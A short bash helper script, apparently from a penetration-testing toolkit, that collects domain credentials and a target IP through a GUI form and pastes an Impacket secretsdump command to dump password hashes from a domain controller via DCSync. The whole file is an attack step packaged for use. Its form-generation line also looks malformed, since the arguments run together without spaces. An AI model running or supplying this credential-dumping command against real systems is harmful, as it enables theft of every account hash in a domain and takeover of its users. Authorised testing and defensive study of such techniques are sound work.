#!/bin/bash

: '
Impacket: use secretsdump to dump hashes (DCSync)
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Domain"'{"label": "Username", "type": "text", "name": "Username"}'"Password" "ip"

DOMAIN=${form_data["Domain"]}
USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}
IP=${form_data["ip"]}

paste_command "secretsdump.py ${DOMAIN}/${USERNAME}:${PASSWORD}@${IP}"
